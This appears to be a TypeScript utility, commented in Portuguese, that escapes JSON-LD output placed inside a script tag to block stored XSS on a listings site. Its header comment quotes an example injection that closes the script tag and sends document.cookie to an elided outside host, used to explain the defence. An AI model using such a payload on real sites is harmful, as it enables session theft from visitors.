/**
 * Serialização de dados estruturados (JSON-LD) para dentro de um
 * `<script type="application/ld+json">`.
 *
 * `JSON.stringify` **não** escapa `<`, `>` nem `&`, porque não tem de o fazer:
 * são caracteres perfeitamente válidos numa string JSON. Mas o sítio onde o
 * resultado vai parar não é um ficheiro `.json` — é o corpo de um elemento
 * `<script>` dentro de HTML, e aí o analisador do browser procura a sequência
 * `</script` **antes** de qualquer regra de JSON se aplicar. Um nome de
 * coudelaria ou uma descrição de anúncio que contenha
 *
 *   </script><script>fetch("https://…/" + document.cookie)</script>
 *
 * fecha o bloco de dados e abre um bloco de código. O conteúdo destas páginas
 * vem de quem publica anúncios e de quem regista coudelarias, ou seja, de fora:
 * é XSS armazenado, e a CSP não o apanha porque o `script-src` traz
 * `'unsafe-inline'`.
 *
 * A defesa é escapar para sequências `\uXXXX`, que dentro de uma string JSON
 * são o mesmo carácter — o `JSON.parse` devolve exactamente o texto original,
 * portanto os dados que o Google lê não mudam — mas que já não são lidas como
 * marcação pelo analisador de HTML.
 *
 * `U+2028` e `U+2029` vão pela mesma razão, noutra camada: são terminadores de
 * linha para o analisador de JavaScript e não para o de JSON, e por isso partem
 * ao meio qualquer script que embrulhe este texto.
 */

/* Construídos a partir do código do ponto, e não escritos de viva voz: os dois
   são invisíveis num editor, e um carácter invisível dentro de uma classe de
   caracteres é a espécie de coisa que se perde num copiar-e-colar, ou que uma
   ferramenta de formatação normaliza, sem ninguém dar por ela. */
const SEPARADOR_DE_LINHA = String.fromCharCode(0x2028);
const SEPARADOR_DE_PARAGRAFO = String.fromCharCode(0x2029);

const ESCAPES: Record<string, string> = {
  "<": "\\u003c",
  ">": "\\u003e",
  "&": "\\u0026",
  [SEPARADOR_DE_LINHA]: "\\u2028",
  [SEPARADOR_DE_PARAGRAFO]: "\\u2029",
};

const A_ESCAPAR = new RegExp(`[<>&${SEPARADOR_DE_LINHA}${SEPARADOR_DE_PARAGRAFO}]`, "g");

/**
 * Devolve o JSON de `dados` pronto a entrar num
 * `<script type="application/ld+json">`.
 *
 * Usar sempre esta função em vez de `JSON.stringify` nesse sítio; ver acima o
 * porquê.
 */
export function serializarJsonLd(dados: unknown): string {
  return JSON.stringify(dados).replace(A_ESCAPAR, (c) => ESCAPES[c]);
}
